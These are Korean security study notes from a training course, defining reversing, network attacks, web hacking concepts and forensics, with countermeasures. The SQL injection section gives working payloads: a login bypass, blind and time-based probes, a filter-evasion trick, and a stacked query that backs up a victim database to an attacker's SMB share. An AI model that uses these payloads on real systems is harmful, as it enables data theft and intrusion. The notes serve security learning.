# 보안 개념 정리 by SuHeon

## Best of the Best 10th
https://www.mycompiler.io/new/asm-x86_64
컴파일 사이트

### 리버싱이란?
리버스 엔지니어링이라고도 불리는 리버싱은 기계, 혹은 프로그램을 뜯어서 분석하는 행위를 말합니다.

리버싱을 배우기 위해서는 컴파일, 기계어, 어셈블리어

### 리버싱은 크게 정적분석/동적분석으로 나뉜다.
- 정적분석 툴로는 IDA, ghidra
- 동적분석 툴로는 IDA, X64dbg

### 리버싱 배우면
- 프로그램의 동작 원리를 배울 수 있다.
- 프로그래밍에서 매주 중요한 메모리를 이해할 수 있습니다.
- 분석 능력이 매우 상승합니다.

### MITM 중간자공격

### 네트워크 해킹 기법
- DoS Attack
- ARP Spoofing
- DNS Spoofing
- Evil Twin
- TCP Session Hijacking

### 네트워크
서로 떨어져 있는 컴퓨터끼리 연결되는 망

### 프로토콜
컴퓨터 사이에 메시지를 주고받기 위한 통신방법에 대한 규칙과 약속

### 패킷
통신을 할 때 전송되는 내용물

### SYN Flood
서로 연결하는 과정에서 피연결측에서 접속을 받아들이기 위해 메모리에 일정 공간을 할당한 상태로 대기한다. 이때 공격자가 많은 SYN 패킷을 보내서 피해자의 메모리가 꽉 차게 만들어 더 이상 연결을 받아들일 수 없게 만든다.

### ICMP(Internet Control Message Protocol) Flood
패킷의 크기를 최대한 키우고 보내면, 패킷은 잘게 쪼개져서 공격 대상에게 전달된다. 공격 대상은 쪼개진 패킷을 모두 처리해야 하므로 부하가 걸리게 된다.

### DRDoS(Distributed Reflect Denial of Service)
분산 반사 서비스 거부 공격.

송신자 IP 주소를 피해자의 IP로 조작하여 정상적으로 서비스를 하는 서버들에게 서비스를 요청한다.

### ARP
Address Resolution Protocol 약자로 직역하면 주소 결정 프로토콜이다. 네트워크 상에서 IP 주소를 MAC주소로 대응시키기 위해 사용되는 프로토콜

### ARP Spoofing
공격자가 의도적으로 특정 IP 주소의 MAC 주소를 자신의 MAC 주소로 변경하는 공격. 공격자의 MAC 주소를 변경하여 도청이 가능하게 된다.

공격자는 도청 중인 사실을 들키지 않기 위해 수신 받은 데이터를 원래 목적지에 전송한다.

### DNS Spoofing
DNS 서버로 보내는 질문을 가로채서 변조된 결과를 보낸다.

방법은 2가지가 있다.
1. DNS 서버에 IP주소를 변경하는 방법
2. DNS 요청에 위조된 패킷을 보내는 방법

hosts 파일을 생성하고, 공격자의 웹 서버 IP 속성 도메인을 작성해준다.

dnsspoof 명령어로 피해자에게 hosts파일을 전송

### Evil Twin
합법적인 네트워크인 것처럼 가장한 무선 네트워크

공격자는 가짜 와이파이를 통해 사용자들의 신용카드 번호 등 개인정보를 훔칠 수 있고, 도청까지 할 수 있다.

아래는 라우터 펌웨어 업그레이드를 빌미로 WPA 패스워드를 묻는 가짜 라우터 설정 페이지이다.

### TCP Session Hijacking
Session Hijacking : 일반 사용자가 이미 시스템에 접속되어 있는 상태를 가로채는 공격
TCP Session Hijacking : TCP 세션을 훔쳐서 새로운 시퀀스 넘버를 보내서 마치 클라이언트인척하며 연결을 이어나가는 공격

### 이러한 고전적 취약점이 왜 고쳐지지 않을까?
이미 구축된 것을 다 뜯어고치기엔 무리가 있다

### 대응방안
- 네트워크 장비의 취약점 및 강화 설정
- 로그인 패스워드 강화 설정
- 원격접속 보안 강화 설정
- 불필요한 서비스 제거
- 불필요한 규칙 존재 여부 점검
- 명확한 출발지와 목적지 지정 여부 점검
- 패치
- 패스워드 주기적으로 변경
- 실시간 모니터링 및 경보 알림 기능 설정
- 보안시스템을 우회하는 경로 여부 파악
- 원격 접속을 허용한 IP 주소 설정
- 원격 접속 보안 강화 설정
- 지속적인 인증

### Code QL
소스코드들의 특징들을 읽어들여 데이터베이스화 시키고 이것을 대상으로 쿼리문을 보내면, 쿼리에 대한 결과문을 반환해줌.

### LGTM
매번 커밋 자동 분석, 깃허브 프로젝트들 자동 분석
LGTM 은 자동으로 기존 취약점과 비슷한 모습을 한 취약점이 있는지 리뷰를 하고 그 결과를 보여줌

### Jeorn
쿼리로 취약점을 찾는 다른 도구

### 패치 갭
오픈소스 코드에서 취약점이 패치가 된 뒤, 유저에게 이 패치가 배포되기까지 시간이 걸리는데 이러한 시간상의 공백(Gap)을 의미

### 퍼징
취약점을 자동으로 찾는 도구 또는 테스팅

### 퍼저
취약점을 자동으로 찾는 도구의 동작 순서

### 해쉬값 구하기
`certutil -hashfile 파일명 MD5`
`certutil -hashfile 파일명 SHA1`
`certutil -hashfile 파일명 SHA256`

### exploitable
개발할 수 있는, 이용할 수 있는

### 시스템 해킹
== 포너블

### 쉘 코드
공격자가 임의의 명령어, 공격 코드

### 디버깅
컴퓨터 프로그램 개발 단계 중에 발생하는 시스템의 논리적인 오류나 비정상적인 연산을 찾아내는 과정

IDA & 디컴파일러 써보기

어셈블리어 공부

### ACC 레지스터
데이터를 기억시키기 전에 보관하는 레지스터 혹은 기억 장소에서 불러나와서 보관되는 레지스터

### MBR(Master Boot Record)
마스터 부트 레코드, MBR은 운영체계가 어디에, 어떻게 위치해 있는지를 식별하여 컴퓨터의 주기억장치에 적재될 수 있도록 하기 위한 정보

### CR3 레지스터
페이지 디렉토리가 올라간다.

### XSS
세션 ID가 저장되어 있는 쿠키
[설명](https://intadd.tistory.com/60)

admin의 쿠키값을 탈취해서 쿠키값을 바꾸면

admin의 세션으로 하이재킹 가능하다.

### Interger Overflow/Underflow
값을 더하거나 뺄 때 바이트 범위를 초과하는 것.

### Stack/Heap Buffer Overflow
- 스택은 큰 주소값에서 작은 주소값
- 힙은 작은 주소값에서 큰 주소값
초과되는 크기의 데이터를 저장한 후 커널 영역에 침범

### Double free / Use After Free
직역

### fuzzing
예상치 않은 또는 무작위 데이터를 입력함으로써 예외를 발생시키고 취약점을 찾는 방법

### 법과학
범죄 사실을 규명하기 위해 각종 증거를 과학적으로 분석하는 분야

### 디지털 포렌식
전자 정보가 있는 디지털 기기에서 각종 데이터를 보존, 수집, 확인, 식별, 분석, 기록, 재현, 현출하는 것을 과학적인 방법으로 법적 효력을 갖도록 수행하는 일련의 과정

### 디지털 포렌식 절차와 기술
권한확보 -> 수집 -> 이송 -> 분석 -> 공판준비 ->법정증언 ->파기

### 피싱: Private + Fishing
가. 피싱의 요소: 도구(메신저, 우편물 등 대상에게 정보를 전달할 수 있는 매체), 미끼(협박, 대출, 성적인 것, 택배 등 유인할 만한 요소), 대상
나. 스피어 피싱(Spear Phishing). APT의 한 종류. 명확한 공격 대상이 정해져 있는 타겟형 피싱.
다. 스미싱(SMS Phishing). 문자메시지를 이용해 피해자를 속이는 피싱 기법.
라. 보이스 피싱(Voice Phishing). 전기통신기기를 사용해 사칭한 후 피해자를 기만하여 개인정보 및 금전을 탈취.

### Fuzzer 기능
무작위 또는 일정 규칙에 따른 입력 생성, 변조 과정을 자동화

### Shell Code
소프트웨어 취약점을 exploit할 시 payload로 사용되는 작은 code

### 제로데이 공격
시스템의 보안 취약점이 발견된 뒤 이를 막을 수 있는 패치가 발표되기도 전에 그 취약점을 이용한 악성코드나 해킹 공격을 감행하는 수법

### 원데이 공격
원데이 공격은 S/W 업체들이 패치를 발표한 당일에 패치를 분석하거나 업데이트 된 버전의 diff 정보를 분석하여 어떤 취약점을 어떻게 수정하였는지 발견하고 패치가 완료되지 않은 시스템을 대상으로 그 취약점을 공격하는 방식.

### 데이터 베이스
정보 암호화 하여 데이터 보호

### 웹의 구조
1. Web Client
2. F/W 방화벽
3. Web F/W 웹 방화벽
4. Web Server
5. Web Application Server
6. DataBase

### HTTP Packet Layout
[ 이더넷 / IP / TCP / HTTP / Data ]

### TCP기반의 프로토콜
패킷 송/수신 전에 TCP-3way Handshacking이 선행 되어야 함. 평문이므로 정보를 읽을 수 있다.

### HTTP Request/Response
1. Start Line
2. Message Header
3. Blank
4. Message Body

### HTTP 주요 메소드
1. GET : 자원 요청
2. POST : 엔티티를 포함한 자원 요청
3. HEAD : HTTP Header 정보만 수신
4. TRACE : Request의 루프백 테스트
5. PUT : URL에 자원을 생성
6. DELETE : URL의 자원을 삭제
7. OPTIONS : 응답 가능한 HTTP 메소드를 요청
8. CONNECT : 터널링의 목적으로 연결 요청(프록시에서 사용함)

### Respnse 응답 코드
1xx : Information
- 100 : Continue

2xx : Success
- 200 : OK
- 201 : Created
- 202 : Accepted

3xx : Redirection
- 301 : Moved Permanently
- 302 : Found

4xx : Client Error
- 400 : Bad Request
- 401 : Unauthorized
- 403 : Forbidden
- 404 : Not Found

5xx : Server Error
- 500 : Internal Server Error

### Session Token
세션을 인증하기 위한 정보

인증에 관련된 정보는 서버와 클라이언트 양쪽에 저장되어야 함.

### Session
어떤 일이 시작되는 시점부터 끝날 때까지를 의미

네트워크에서는 두 대의 시스템간의 활성화된 접속을 의미

### 세션 매니지먼트
1. 클라이언트가 웹 서버에 최초로 접근하게 되면 서버는 세션 토큰을 클라이언트에게 준다.
2. 서버로부터 발행된 세션 토큰은 세션이 활성화 되어있는 동안 웹서버와 클라이언트 양쪽에 모두 보관되어 유지되어야 한다.
3. 클라이언트에 저장된 세션 토큰은 서버에게 Request시 항상 포함된다.
4. 세션이 종료되면 세션 토큰은 파기되어야한다.

### XSS 공격 시나리오
XSS를 이용하여 Admin 쿠키 값 획득

획득한 쿠키 값을 사용하여 Admin 계정 로그인

### 쿠키
웹 어플리케이션 서버가 클라이언트 식별에 사용되는 정보를 클라이언트에 저장하기 위해 가장 널리 사용되는 방법

각 쿠키는 4KB를 넘지 못함. 브라우저마다 다를 수 있음.

### 쿠키의 용도
세션을 관리하기 위한 세션토큰

일반적으로 세션 쿠키(브라우저 캐시)에 저장됨

### 쿠키의 생성코드
- domain : 쿠키가 유효한 도메인
- path : 도메인의 하위 경로
- expires : 쿠키의 만료 시간
- secure : https로 접근할 때만 Cookie 값을 사용
- httponly : 스크립트에 의해 쿠키접근을 제한

### Bypassing Client Side Validation
소스코드 수정하기

Javascript가 포함된 HTML  코드를 저장 후 내용을 조작

### Web Proxy Tool을 이용한 우회
Request 혹은 Response 되는 데이터를 Proxy tool을 이용하여 직접 조작

### Sniffing
Base64 방식으로 인코딩된 ID와 PW를 수집하여 Base64 Decoding한다.

### 브루트포스
ID와 PW를 브루트포스하여 계정정보를 획득

툴 : brutus-aet2, wwwhack, hydra 등

### Web Session
Session Token 생성 알고리즘이 간단하여 쉽게 유추할 수 있는 경우. 이것을 브루트포싱으로 알아냄.

### Web Session Fixation
Victim이 로그인 하기 전 Victim의 Session ID를 공격자가 원하는 값으로 고정시키는 방법.

### Cookie Stealing
쿠키를 공격자에게 전송하는 악성스크립트

Image 객체 생성 후 스크립트를 이용하여, Image의 Location 속성을 변경

### XST(CROSS SITE TRACING)
TRACE 메소드를 이용한 공격

스크립트에 의해 쿠키를 읽지 못하도록 설정되어 있는 경우에 이를 우회하기 위해서 사용

**Trace 메소드란?**

웹 서버에 제출된 HTTP Request를 Resopnse Body에 포함하여 클라이언트로 전송하는 메소드

### SQL Injection  
ID : `OR `1`=`1  
PW : `OR `1`=`1  
데이터베이스명 알아내기 : `and db_name() > 1 --  
TABLE명 알아내기 : SELECT * FROM Information_schema.colums  
DATA 알아내기 : Table과 Column 이름을 파악했으므로 각각의 데이터도 알아낼 수 있다.  

### Blind SQL Injection
웹 서버에서 SQL Injection을 대응하기 위해서 내부 DB오류를 보여주지 않도록 설정해놓은 경우 참과 거짓을 구분할 수 있는 구문을 만들어 데이터를 알아내는 방법

SELECT * FROM member WHERE user_id="nuno" AND substring(db_name(),1,1) ='w'--  
db_name()의 반환값이 첫 번째 문자열이 w인 경우  
정상적으로 로그인 됨.  

### Waitfor Delay
쿼리 성공 실패를 확인할 수 있다.  
조건이 참인 경우 : 해당 시간 동안 지연시킨 후 결과를 반환  
조건이 거짓인 경우 : 곧 바로 결과 반환  
IF (SELECT current_user) ='dbo' WAITFOR DELAY '0:0:5'  
현재DB 사용자가 dbo라면 결과는 5초후에 반환 되게 된다. dbo가 아닌 계정이라면 곧 바로 결과가 반환된다.  

### Stored Procedure
DBMS에서 지원하는 저장된 프로시져

공격자는 이런 보안상 취약한 프로시저를 이용하여  
쉘을 수행시키거나 쿼리의 결과를 HTML로 제공,  
레지스트리 조작, 서비스 시작/중지, 시스템 정보 획득  

### DB 덤프
쓰기 속성이 포함된 공유폴더를 준비한다.  
SQL Injection을 이용한 DB Backup을 시도한다.  
ID : nuno'; backup database webhack to disk='\\172.16.1.3\share\webhack.dat'  

### SQL Injection 대응책
1. 문자 필터링
2. DB권한 낮춘다
3. 에러 메시지 제한한다.
4. 중요한 쿼리는 Stored Procedure로 작성하여 사용한다
5. Web 방화벽 사용

### Filtering 우회의 원리
공격을 막고자 하는 대부분의 필터링 장비들은 블랙 리스트 타입의 탐지 매커니즘을 사용하므로 Encoding 기법에 의해 우회가 가능

### Splitting the Query
SQL 쿼리 구문을 쪼개서 시그니처 탐지에 걸리지 않도록 우회  
INPUT : `SE%LECT` / OUTPUT : `SELECT`  
% 뒤의 L은 Hex값에 사용되는 문자열이 아니므로 %가 무시된다.  
(Hex 값에는 A, B, C, D, E, F만 사용됨)

### Mass SQL Injection
기존의 SQL Injection에서 확장된 개념으로 한번의 공격으로 대량의 DB값이  
변조되어 홈페이지에 치명적인 악영향을 미치는 공격  
서버 측에서 입력 값의 길이를 제한하여 막음  

### Cookie Injection
GET 혹은 Post가 아닌 Cookie를 통해서 데이터를 전달하는 것을 의미함.  

### Path Traversal
사용자로부터 입력된 데이터가 웹 서버의 파일이나 디렉토리를 참조하는 용도로 사용될 경우 발생

가급적 사용자로부터 입력받은 데이터를 파일 시스템에 접근하는 path로 사용하지 않는다.

### File Download 취약점
파일 다운로드 기능을 가진 웹 애플리케이션에서 파일명이 제대로 검사되지 않는 경우.  
중요한 시스템 파일 노출

### File Upload 취약점
웹 애플리케이션에서 제공하는 파일 업로드 기능을 이용하여 서버에 악성 스크립트를 업로드 시키는 것.

**조건**
1. 파일 업로드 가능
2. 업로드 된 디렉토리 경로
3. 업로드 된 디렉토리에 실행권한

**대응책**
허용된 확장자만 업로드 가능하도록 제한

### Directory Listing 취약점
웹 서버의 잘못된 환경설정으로 인해 디렉토리와 파일목록을 노출하게 됨.

---